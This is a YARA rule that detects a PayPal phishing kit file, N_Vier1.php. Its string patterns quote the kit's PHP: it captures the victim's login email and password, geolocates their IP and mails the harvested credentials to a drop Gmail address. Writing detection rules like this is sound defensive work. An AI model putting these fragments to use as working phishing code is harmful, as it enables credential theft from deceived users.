rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier1 {
  meta:
    description = "case127 - file N_Vier1.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara"
    date        = "2018-06-08"
    hash1       = "3e15a86132e2a3423bc3101968c1b7e5ec2a23729f60640635024908db3654a4"

  strings:
    $s1  = "$subject = 'Login Account [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';" fullword ascii
    $s2  = "header(\"location: suspicious.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
    $s3  = "$dump = unserialize(file_get_contents($u));" fullword ascii
    $s4  = "$message .= '|Password            :  '.$_POST['login_password'].\"\\r\\n\";" fullword ascii
    $s5  = "$message .= '|Email               :  '.$_POST['login_email'].\"\\r\\n\";" fullword ascii
    $s6  = "$u = \"http://www.geoiptool.com/?IP='$ip'\";" fullword ascii
    $s7  = "$message .= \"IP Geo       : http://www.geoiptool.com/?IP=\".$ip.\"  ====\\n\";" fullword ascii
    $s8  = "mail(\"rezult277@gmail.com\", $subject, $message);" fullword ascii
    $s9  = "$country = $dump[\"geoplugin_countryName\"];" fullword ascii
    $s10 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
    $s11 = "$messags   =  \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'].\"\\r\\n\";" fullword ascii
    $s12 = "$message = '|================ bs7a rzlt ===============|'.\"\\r\\n\";" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 2KB and
      (8 of them)
    ) or (all of them)
}